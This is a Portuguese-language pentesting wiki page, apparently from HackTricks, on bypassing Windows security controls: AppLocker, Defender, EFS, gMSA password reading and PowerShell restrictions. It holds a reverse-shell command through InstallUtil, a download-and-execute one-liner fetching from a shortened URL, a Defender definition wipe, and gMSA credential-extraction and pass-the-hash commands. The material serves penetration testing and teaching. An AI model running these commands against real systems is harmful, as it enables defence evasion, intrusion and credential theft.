# Controles de segurança do Windows

{{#include ../../banners/hacktricks-training.md}}

## Política do AppLocker

Uma lista de permissões de aplicativos é uma lista de aplicativos de software ou executáveis aprovados que podem estar presentes e ser executados em um sistema. O objetivo é proteger o ambiente contra malware nocivo e software não aprovado que não esteja alinhado às necessidades específicas da organização.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) é a **solução de lista de permissões de aplicativos** da Microsoft e dá aos administradores de sistema controle sobre **quais aplicativos e arquivos os usuários podem executar**. Ele oferece **controle granular** sobre executáveis, scripts, arquivos do Windows Installer, DLLs, aplicativos empacotados e instaladores de aplicativos empacotados.\
É comum que as organizações **bloqueiem cmd.exe e PowerShell.exe** e o acesso de gravação a determinados diretórios, **mas tudo isso pode ser bypassed**.

### Verificar

Verifique quais arquivos/extensões estão na lista de bloqueio ou na lista de permissões:

```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```

Este caminho do registro contém as configurações e políticas aplicadas pelo AppLocker, permitindo revisar o conjunto atual de regras aplicadas no sistema:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- **Pastas graváveis** úteis para contornar a política do AppLocker: se o AppLocker permitir executar qualquer coisa dentro de `C:\Windows\System32` ou `C:\Windows`, há **pastas graváveis** que você pode usar para **contornar isso**.

```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```

- Binários [**"LOLBAS's"**](https://lolbas-project.github.io/) comumente **confiáveis** também podem ser úteis para fazer bypass do AppLocker.
- **Regras mal escritas também podem ser contornadas**
  - Por exemplo, com **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, você pode criar uma **pasta chamada `allowed`** em qualquer lugar, e ela será permitida.
  - As organizações também costumam se concentrar em **bloquear o executável `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, mas se esquecem dos [**outros locais do executável do PowerShell**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations), como `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ou `PowerShell_ISE.exe`.
- A aplicação de regras para **DLLs raramente é habilitada**, devido à carga adicional que pode impor ao sistema e à quantidade de testes necessários para garantir que nada pare de funcionar. Portanto, usar **DLLs como backdoors ajudará a fazer bypass do AppLocker**.
- Você pode usar [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ou [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) para **executar código Powershell** em qualquer processo e fazer bypass do AppLocker. Para mais informações, consulte: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## Armazenamento de credenciais

### Security Accounts Manager (SAM)

As credenciais locais estão presentes neste arquivo; as senhas são armazenadas como hashes.

### Local Security Authority (LSA) - LSASS

As **credenciais** (em hash) são **salvas** na **memória** desse subsistema para permitir o Single Sign-On.\
A **LSA** administra a **política de segurança** local (política de senhas, permissões de usuários...), a **autenticação**, os **tokens de acesso**...\
A LSA é responsável por **verificar** as credenciais fornecidas no arquivo **SAM** (para um login local) e **se comunicar** com o **controlador de domínio** para autenticar um usuário do domínio.

As **credenciais** são **salvas** no **processo LSASS**: tickets Kerberos, hashes NT e LM, senhas facilmente descriptografadas.

### Segredos da LSA

A LSA pode salvar algumas credenciais em disco:

- Senha da conta de computador do Active Directory (controlador de domínio inacessível).
- Senhas das contas dos serviços do Windows
- Senhas de tarefas agendadas
- Mais (senha de aplicações IIS...)

### NTDS.dit

É o banco de dados do Active Directory. Está presente apenas nos controladores de domínio.

## Defender

O [**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) é um antivírus disponível no Windows 10 e Windows 11, e em versões do Windows Server. Ele **bloqueia** ferramentas comuns de pentesting, como **`WinPEAS`**. No entanto, há maneiras de **fazer bypass dessas proteções**.

### Verificação

Para verificar o **status** do **Defender**, você pode executar o cmdlet PS **`Get-MpComputerStatus`** (verifique o valor de **`RealTimeProtectionEnabled`** para saber se está ativo):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Para enumerá-lo, você também pode executar:

```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

## Sistema de Arquivos Criptografados (EFS)

O EFS protege arquivos por meio de criptografia, utilizando uma **chave simétrica** conhecida como **Chave de Criptografia de Arquivo (FEK)**. Essa chave é criptografada com a **chave pública** do usuário e armazenada no **fluxo de dados alternativo** $EFS do arquivo criptografado. Quando é necessário descriptografar o arquivo, a **chave privada** correspondente ao certificado digital do usuário é usada para descriptografar a FEK do fluxo $EFS. Mais detalhes podem ser encontrados [aqui](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Cenários de descriptografia sem intervenção do usuário** incluem:

- Quando arquivos ou pastas são movidos para um sistema de arquivos que não seja EFS, como [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), eles são descriptografados automaticamente.
- Arquivos criptografados enviados pela rede usando o protocolo SMB/CIFS são descriptografados antes da transmissão.

Esse método de criptografia permite **acesso transparente** aos arquivos criptografados pelo proprietário. No entanto, simplesmente alterar a senha do proprietário e fazer login não permitirá a descriptografia.

**Principais pontos**:

- O EFS usa uma FEK simétrica, criptografada com a chave pública do usuário.
- A descriptografia usa a chave privada do usuário para acessar a FEK.
- A descriptografia automática ocorre em condições específicas, como ao copiar arquivos para FAT32 ou durante a transmissão pela rede.
- O proprietário pode acessar os arquivos criptografados sem etapas adicionais.

### Verificar informações do EFS

Verifique se um **usuário** **usou** esse **serviço**, conferindo se este caminho existe:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Verifique **quem** tem **acesso** ao arquivo usando cipher /c \<file>\
Você também pode usar `cipher /e` e `cipher /d` dentro de uma pasta para **criptografar** e **descriptografar** todos os arquivos

### Descriptografar arquivos EFS

#### Sendo Authority System

Este método requer que o **usuário vítima** esteja **executando** um **processo** no host. Se esse for o caso, usando uma sessão `meterpreter`, você pode se passar pelo token do processo do usuário (`impersonate_token` do `incognito`). Ou você pode simplesmente executar `migrate` para migrar para o processo do usuário.

#### Sabendo a senha do usuário

A documentação do Mimikatz explica como importar o certificado e o material da chave privada do usuário e descriptografar arquivos protegidos por EFS quando a senha é conhecida.<sup>[[6]](#references)</sup>

## Contas de Serviço Gerenciadas por Grupo (gMSA)

A Microsoft desenvolveu **Contas de Serviço Gerenciadas por Grupo (gMSA)** para simplificar o gerenciamento de contas de serviço em infraestruturas de TI. Ao contrário das contas de serviço tradicionais, que geralmente têm a configuração "**A senha nunca expira**" habilitada, as gMSAs oferecem uma solução mais segura e fácil de gerenciar:

- **Gerenciamento automático de senha**: as gMSAs usam uma senha complexa de 240 caracteres, que muda automaticamente de acordo com a política do domínio ou do computador. Esse processo é gerenciado pelo Key Distribution Service (KDC) da Microsoft, eliminando a necessidade de atualizações manuais da senha.
- **Segurança aprimorada**: essas contas não estão sujeitas a bloqueios e não podem ser usadas para logins interativos, o que aumenta a segurança.
- **Suporte a vários hosts**: as gMSAs podem ser compartilhadas entre vários hosts, sendo ideais para serviços executados em vários servidores.
- **Compatibilidade com tarefas agendadas**: ao contrário das contas de serviço gerenciadas, as gMSAs permitem executar tarefas agendadas.
- **Gerenciamento simplificado de SPN**: o sistema atualiza automaticamente o Service Principal Name (SPN) quando há alterações nos detalhes sAMaccount ou no nome DNS do computador, simplificando o gerenciamento de SPN.

As senhas das gMSAs são armazenadas na propriedade LDAP _**msDS-ManagedPassword**_ e redefinidas automaticamente a cada 30 dias pelos Controladores de Domínio (DCs). Essa senha, um blob de dados criptografado conhecido como [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), só pode ser recuperada por administradores autorizados e pelos servidores nos quais as gMSAs estão instaladas, garantindo um ambiente seguro. Para acessar essas informações, é necessária uma conexão segura, como LDAPS, ou a conexão deve ser autenticada com 'Sealing & Secure'.

![Retransmitindo a autenticação NTLM para recuperar uma senha gMSA](../../images/asd1.png)<sup>[[1]](#references)</sup>

Você pode ler essa senha com [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**<sup>[[2]](#references)</sup>

```
/GMSAPasswordReader --AccountName jkohler
```

[**Encontre mais informações na pesquisa original arquivada**](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/).<sup>[[1]](#references)</sup>

A mesma pesquisa explica como um **ataque NTLM relay** pode obter uma **senha gMSA** quando o principal retransmitido tem autorização para ler `msDS-ManagedPassword`.<sup>[[1]](#references)</sup>

### Abusando do encadeamento de ACLs para ler a senha gerenciada de gMSA (GenericAll -> ReadGMSAPassword)

Em muitos ambientes, usuários com poucos privilégios podem obter acesso a segredos de gMSA sem comprometer o DC, abusando de ACLs de objetos mal configuradas:<sup>[[3]](#references)</sup>

- Um grupo que você pode controlar (por exemplo, via GenericAll/GenericWrite) recebe `ReadGMSAPassword` sobre uma gMSA.
- Ao adicionar-se a esse grupo, você herda o direito de ler o blob `msDS-ManagedPassword` da gMSA por LDAP e derivar credenciais NTLM utilizáveis.

Fluxo de trabalho típico:

1) Descubra o caminho com o BloodHound e marque seus principais de foothold como Owned. Procure por relações como:
   - GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Adicione-se ao grupo intermediário que você controla (exemplo com bloodyAD):

```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```

3) Leia a senha gerenciada do gMSA via LDAP e derive o hash NTLM. O NetExec automatiza a extração de `msDS-ManagedPassword` e a conversão para NTLM:

```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```

4) Autentique-se como gMSA usando o hash NTLM (não é necessária uma senha em texto simples). Se a conta estiver em Remote Management Users, o WinRM funcionará diretamente:

```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```

Notes:
- Leituras LDAP de `msDS-ManagedPassword` exigem sealing (por exemplo, LDAPS/sign+seal). As ferramentas lidam com isso automaticamente.
- Muitas vezes, gMSAs recebem direitos locais, como WinRM; valide a associação a grupos (por exemplo, Remote Management Users) para planejar o movimento lateral.
- Se você só precisa do blob para calcular o NTLM por conta própria, consulte a estrutura MSDS-MANAGEDPASSWORD_BLOB.

Outro caminho via ACL é uma concessão de escrita no próprio objeto gMSA. `msDS-GroupMSAMembership` é o descritor de segurança usado para decidir quais principals podem recuperar a senha gerenciada. O GUID do esquema é `888eedd6-ce04-df40-b462-b8a50e41ba38`. Uma ACE `WriteProperty` exata nesse atributo para um grupo que você controla pode ser uma opção para alterar a lista de leitores; isso é diferente de já constar na lista de leitores. Confirme a DACL completa, as ACEs de negação e herdadas, e as permissões efetivas antes de considerar esse caminho viável. Uma nova associação a grupo também exige a atualização do token/sessão antes de tentar ler uma senha.<sup>[[7]](#references)</sup>



## LAPS

A **Local Administrator Password Solution (LAPS)**, disponível para download na [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), permite gerenciar senhas de Administrator local. Essas senhas, **aleatórias**, exclusivas e **alteradas regularmente**, são armazenadas centralmente no Active Directory. O acesso a essas senhas é restrito por meio de ACLs a usuários autorizados. Com permissões suficientes, é possível ler as senhas de administrador local.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

O PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **restringe muitos dos recursos** necessários para usar o PowerShell de forma eficaz, como bloquear objetos COM, permitir apenas tipos .NET aprovados, workflows baseados em XAML, classes do PowerShell e muito mais.

### **Verificar**

```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```

### Bypass

```bash
#Easy bypass
Powershell -version 2
```

Nas versões atuais do Windows, esse bypass não funciona mais, mas você pode usar [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Para compilá-lo, talvez seja necessário** **_Adicionar uma referência_** -> _Procurar_ ->_Procurar_ -> adicionar `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` e **alterar o projeto para .Net4.5**.

#### Bypass direto:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```

#### Reverse shell:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```

Você pode usar [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ou [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) para **executar código Powershell** em qualquer processo e contornar o modo de linguagem restrita. Para mais informações, consulte: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## Política de execução do PS

Por padrão, ela está definida como **restricted.** Principais formas de contornar essa política:

```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```

Mais informações podem ser encontradas [aqui](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[5]](#references)</sup>

## Security Support Provider Interface (SSPI)

É a API que pode ser usada para autenticar usuários.

A SSPI seleciona um protocolo de autenticação apropriado para duas máquinas que se comunicam, dando preferência ao Kerberos quando disponível. Esses protocolos são implementados pelos Security Support Providers (SSPs), instalados como DLLs no Windows; ambos os pares devem oferecer suporte ao provedor negociado.

### Principais SSPs

- **Kerberos**: O preferido
  - %windir%\Windows\System32\kerberos.dll
- **NTLMv1** e **NTLMv2**: Por motivos de compatibilidade
  - %windir%\Windows\System32\msv1_0.dll
- **Digest**: Servidores web e LDAP, senha no formato de hash MD5
  - %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL e TLS
  - %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Usado para negociar o protocolo a ser utilizado (Kerberos ou NTLM, sendo Kerberos o padrão)
  - %windir%\Windows\System32\lsasrv.dll

#### A negociação pode oferecer vários métodos ou apenas um.

## UAC - Controle de Conta de Usuário

[O Controle de Conta de Usuário (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) é um recurso que permite **solicitar consentimento para atividades elevadas**.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## References

- [1] [Relaying for gMSA – cube0x0 (Internet Archive)](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/)
- [2] [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [3] [HTB Sendai – 0xdf: gMSA via rights chaining to WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [4] [darthsidious – Contornando o AppLocker e o Modo de Linguagem Restrita do PowerShell](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [5] [NetSPI – 15 maneiras de contornar a política de execução do PowerShell](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [6] [howto ~ descriptografar arquivos EFS](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [7] [Microsoft - atributo ms-DS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
{{#include ../../banners/hacktricks-training.md}}
